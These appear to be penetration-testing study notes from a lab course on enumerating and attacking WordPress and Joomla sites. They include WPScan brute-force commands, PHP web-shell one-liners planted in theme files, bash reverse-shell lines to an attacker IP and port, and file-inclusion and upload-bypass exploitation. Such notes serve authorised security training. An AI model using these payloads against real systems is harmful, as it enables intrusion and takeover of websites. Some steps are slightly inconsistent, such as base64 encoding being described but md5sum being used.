Application Discovery & Enumeration
To secure a network, an organization must maintain a complete inventory of all its assets. This includes:

Hardware: All network-connected devices like servers, workstations, and appliances.

Software and Applications: All installed applications, whether they are local or third-party hosted.

This inventory helps organizations know what to protect and where potential vulnerabilities exist.

Key Details for an Asset Inventory
An effective inventory should track:

The patch level of all applications.

Whether applications are nearing their end-of-life.

The presence of any unauthorized or "shadow IT" applications.

The use of strong passwords and multi-factor authentication (MFA).

The use of access restrictions, like limiting administrative portals to specific IP addresses.

The Role of Penetration Testers
Penetration testers play a crucial role by performing enumeration, which is the process of identifying everything on a network. This can uncover "forgotten" or misconfigured applications with weak credentials, default settings, or public vulnerabilities. Penetration testers often start with a ping sweep to find active hosts, followed by targeted port scanning to identify running services. The data they collect can be used to help an organization enhance its asset inventory and develop proactive security measures.

When facing a large number of hosts with web services (ports 80 and 443), you can use specialized tools to efficiently process the data. Manually sifting through this information or browsing to each host is not feasible.

Recommended Tools
Two excellent tools for this task are EyeWitness and Aquatone.

Functionality: Both tools automate the process of collecting information on web applications. They take raw scan data from tools like Nmap (and others like Masscan or Nessus) and generate a visual report.

Process: They navigate to each identified web service and take a screenshot of the webpage. These screenshots are then compiled into a single, browsable HTML report.

Benefit: This visual report allows a penetration tester to quickly assess the web attack surface, identify interesting or unusual applications, and prioritize which hosts to investigate further. It streamlines the process of narrowing down hundreds of potential targets to a more manageable, focused list.

These tools are available for both Windows and Linux, making them flexible for use in various testing environments.


WordPress - Discovery & Enumeration
Discovery/Footprinting
A quick way to identify a WordPress site is by browsing to the /robots.txt file. A typical robots.txt on a WordPress installation may look like
![alt text](image-10.png)

the presence of the /wp-admin and /wp-content directories would be a dead giveaway that we are dealing with WordPress

Viewing the page with cURL and grepping for WordPress can help us confirm that WordPress is in use and footprint the version number, which we should note down for later. We can enumerate WordPress using a variety of manual and automated tactics.

![alt text](image-11.png)

WordPress stores its plugins in the wp-content/plugins directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the wp-content/themes directory. These files should be carefully enumerated as they may lead to RCE.

five types of users on a standard WordPress installation.

Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.

Editor: An editor can publish and manage posts, including the posts of other users.

Author: They can publish and manage their own posts.

Contributor: These users can write and manage their own posts but cannot publish them.
Subscriber: These are standard users who can browse posts and edit their profiles.


Browsing the site and perusing the page source will give us hints to the theme in use, plugins installed, and even usernames if author names are published with posts.

![alt text](image-12.png)

we can also scan for plugins

![alt text](image-13.png)

we can check other pages with pagetraversal 

![alt text](image-14.png)


We can do some manual enumeration of users as well. As mentioned earlier, the default WordPress login page can be found at /wp-login.php.


A valid username and an invalid password results in the following message:

![alt text](image-15.png)

However, an invalid username returns that the user was not found.

![alt text](image-16.png)

This makes WordPress vulnerable to username enumeration, which can be used to obtain a list of potential usernames.

WPScan is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable. It’s installed by default on Parrot OS but can also be installed manually with gem.

sudo gem install wpscan


WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from WPVulnDB, which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the --api-token parameter.

Each plugin has a readme.txt 

ex: http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt


Attacking WordPress


Login Bruteforce

WPScan can be used to brute force usernames and passwords. 

The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. 

The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php.

attacking method example 

sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

sudo gem install wpscan
to get a list of users 

sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token "token"

to do a password attack: sudo wpscan --password-attack xmlrpc -t 20 -U username -P wordlist  --url --api-token

With administrative access to WordPress, we can modify the PHP source code to execute system commands.

Click on Appearance on the side panel and select Theme Editor. This page will let us edit the PHP source code directly.

An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.

Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.

web shell: system($_GET["cmd"]);

we can change the cmd into the oneliner shell 

using bash -i >& /dev/tcp/ipaddress/port 0>&1

or use 

bash -c 'bash -i >& /dev/tcp/ipaddress/port 0>&1'




The code above should let us execute commands via the GET parameter 0. We add this single line to the file just below the comments to avoid too much modification of the contents.

Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name>. We can interact with the web shell via the browser or using cURL.

As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.

create a reverseshell oneline and then base 64 encode the oneliner
bash -c 'bash -i >& /dev/tcp/10.10.14.239/9001 0>&1'

echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.239/9001 0>&1'" | md5sum

example: curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

The wp_admin_shell_upload module from Metasploit can be used to upload a shell and execute it automatically.

![alt text](image-17.png)

We can then issue the show options command to ensure that everything is set up properly. 

In this lab example, we must specify both the vhost and the IP address, or the exploit will fail with the error Exploit aborted due to failure: not-found: The target does not appear to be using WordPress.

During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. At the very least, our report should have an appendix section that lists the following information—more on this in a later module.

The plugin mail-masta is no longer supported but has had over 2,300 downloads over the years. It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an unauthenticated SQL injection and a Local File Inclusion.

Let's take a look at the vulnerable code for the mail-masta plugin.

![alt text](image-18.png)

As we can see, the pl parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let's exploit this to retrieve the contents of the /etc/passwd file using cURL.

wpDiscuz is a WordPress plugin for enhanced commenting on page posts.

 Based on the version number (7.0.4), this exploit has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. More on the mime type detection functions bypass can be found here.

 The exploit script takes two parameters: -u the URL and -p the path to a valid post.

 The exploit as written may fail, but we can use cURL to execute commands using the uploaded web shell. We just need to append ?cmd= after the .php extension to run commands which we can see in the exploit script.

 ![alt text](image-19.png)


 Joomla 

 Joomla - Discovery & Enumeration

 We can often fingerprint Joomla by looking at the page source, which tells us that we are dealing with a Joomla site.

 ![alt text](image-20.png)

 The robots.txt file for a Joomla site will often look like this:

![alt text](image-21.png)

We can fingerprint the Joomla version if the README.txt file is present.

![alt text](image-22.png)

In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the media/system/js/ directory or by browsing to administrator/manifests/files/joomla.xml.

![alt text](image-23.png)

The cache.xml file can help to give us the approximate version. It is located at plugins/system/cache/cache.xml.

Let's try out droopescan, a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.

sudo pip3 install droopescan

droopescan scan joomla --url http://dev.inlanefreight.local/

The default administrator account on Joomla installs is admin, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this script to attempt to brute force the login.

sudo python3 joomla-brute.py -u http://dev.inlanefreight.local

attacking Joomla

if found creds, login 

click on Templates on the bottom left under Configuration to pull up the templates menu.

we can click on a template name. Let's choose protostar under the Template column header. This will bring us to the Templates: Customise page.

 can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment.

 We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.

 Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows.

system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
Once this is in, click on Save & Close at the top and confirm code execution using cURL.

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id





  